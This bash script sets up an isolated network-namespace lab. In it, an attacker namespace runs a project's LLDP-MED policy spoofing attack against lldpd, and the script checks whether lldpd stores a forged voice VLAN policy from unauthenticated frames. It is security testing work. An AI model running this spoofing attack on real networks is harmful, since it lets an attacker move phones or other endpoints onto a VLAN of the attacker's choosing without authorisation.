#!/usr/bin/env bash
# Isolated LLDP-MED policy spoofing lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with two hosts attached:
#
#   receiver: lldpd in receive-only mode, standing in for an endpoint (such as an IP phone)
#             that accepts LLDP-MED network policies. Its LLDP-MED state is read with lldpctl.
#   attacker: MACabre's LLDP-MED policy sender. It advertises a voice policy: VLAN 20,
#             L2 priority 5, DSCP 46, tagged.
#
# Phases:
#   Phase 1 (baseline): no advertisements. The receiver has no network policy.
#   Phase 2 (attack): the attacker advertises the policy. The receiver should store a voice
#            policy with exactly the VLAN, priority and DSCP the attacker sent.
#
# What the lab shows: whether lldpd stores and reports the forged policy, and that the field
# encoding decodes to the values sent. It does not show whether a phone applies the policy
# to its traffic; that needs the target endpoint. Nothing here touches the host's real
# network interfaces.
#
# Usage:
#   sudo scripts/lab/lldp_med_policy_spoofing_lab.sh
#
# Requirements: iproute2, lldpd (with lldpctl), and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip lldpd lldpctl; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
POLICY_VLAN=20
POLICY_PRIORITY=5
POLICY_DSCP=46
ATTACKER_MAC="02:00:00:00:00:20"
WORK="$(mktemp -d)"
chmod 755 "$WORK"   # lldpd drops privileges and must reach its control socket here
SOCK="$WORK/lldpd.sock"

stop_receiver() {
    for pid in $(ip netns pids receiver 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    for _ in $(seq 1 10); do
        [[ -z "$(ip netns pids receiver 2>/dev/null || true)" ]] && break
        sleep 0.5
    done
}

stop_lab() {
    stop_receiver
    for ns in attacker receiver lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add receiver
ip netns add attacker

for pair in "rcv:receiver" "att:attacker"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
# The Linux bridge does not forward the reserved LLDP address unless group_fwd_mask allows it.
ip netns exec lan ip link set br0 type bridge group_fwd_mask 16384
for name in rcv att; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done
ip netns exec receiver ip link set h-rcv up
ip netns exec attacker ip link set h-att address "$ATTACKER_MAC"
ip netns exec attacker ip link set h-att up

start_receiver() {
    rm -f "$SOCK"
    ip netns exec receiver lldpd -d -r -I h-rcv -u "$SOCK" >>"$WORK/lldpd.log" 2>&1 &
    for _ in $(seq 1 20); do
        [[ -S "$SOCK" ]] && break
        sleep 0.25
    done
    sleep 1
}

neighbors() {
    ip netns exec receiver lldpctl -u "$SOCK" -f keyvalue 2>/dev/null || true
}

ATTACK_CODE='
import os, threading
from macabre.attacks.lldp_med_policy_spoofing import LldpMedPolicySpoofingConfig, run_lldp_med_policy_spoofing
stats = run_lldp_med_policy_spoofing(
    LldpMedPolicySpoofingConfig(
        iface="h-att",
        source_mac=os.environ["ATTACKER_MAC"],
        application="voice",
        tagged=True,
        vlan_id=int(os.environ["POLICY_VLAN"]),
        priority=int(os.environ["POLICY_PRIORITY"]),
        dscp=int(os.environ["POLICY_DSCP"]),
        frames=3,
        interval=0.5,
    ),
    threading.Event(),
    lambda _: None,
)
print(stats.frames)
'

run_attack() {
    ip netns exec attacker env PYTHONPATH="$ROOT/src" ATTACKER_MAC="$ATTACKER_MAC" \
        POLICY_VLAN="$POLICY_VLAN" POLICY_PRIORITY="$POLICY_PRIORITY" POLICY_DSCP="$POLICY_DSCP" \
        "$PY" -c "$ATTACK_CODE"
}

# Prints the stored policy fields for the receiver's port, one per line (empty when none).
stored_policy() {
    neighbors | grep "lldp-med.policy\." | grep -E "\.(apptype|vlan\.vid|pcp|dscp)=" || true
}

echo "Phase 1: baseline, no LLDP-MED advertisement"
start_receiver
BASE="$(stored_policy)"
if [[ -z "$BASE" ]]; then
    echo "  stored network policy: none"
else
    echo "  stored network policy:"
    sed 's/^/    /' <<<"$BASE"
fi
echo

echo "Phase 2: the attacker advertises a voice policy: VLAN $POLICY_VLAN, priority $POLICY_PRIORITY, DSCP $POLICY_DSCP"
SENT="$(run_attack 2>/dev/null || echo 0)"
echo "  advertisements sent: $SENT"
sleep 2
ATTACK="$(stored_policy)"
if [[ -z "$ATTACK" ]]; then
    echo "  stored network policy: none"
else
    echo "  stored network policy:"
    sed 's/^/    /' <<<"$ATTACK"
fi
echo

STORED_VLAN="$(grep "policy.vlan.vid=" <<<"$ATTACK" | cut -d= -f2 || true)"
STORED_PCP="$(grep "policy.pcp=" <<<"$ATTACK" | cut -d= -f2 || true)"
STORED_DSCP="$(grep "policy.dscp=" <<<"$ATTACK" | cut -d= -f2 || true)"
STORED_APP="$(grep "policy.apptype=" <<<"$ATTACK" | cut -d= -f2 || true)"

if [[ -z "$BASE" && "$SENT" == "3" && "$STORED_VLAN" == "$POLICY_VLAN" && "$STORED_PCP" == "$POLICY_PRIORITY" \
      && "$STORED_DSCP" == "$POLICY_DSCP" && "$STORED_APP" == "Voice" ]]; then
    echo "Result: before the advertisements the receiver stored no network policy. After three forged LLDP-MED advertisements it stored a voice policy with VLAN $STORED_VLAN, priority $STORED_PCP and DSCP $STORED_DSCP, the values sent. The receiver accepts the policy from an unauthenticated frame. Whether a phone applies it is not tested here."
    exit 0
elif [[ "$SENT" != "3" ]]; then
    echo "Result: inconclusive. The attacker did not send the advertisements. Result unreliable."
    exit 2
else
    echo "Result: the outcome did not match the expected phases. Result unreliable."
    exit 1
fi
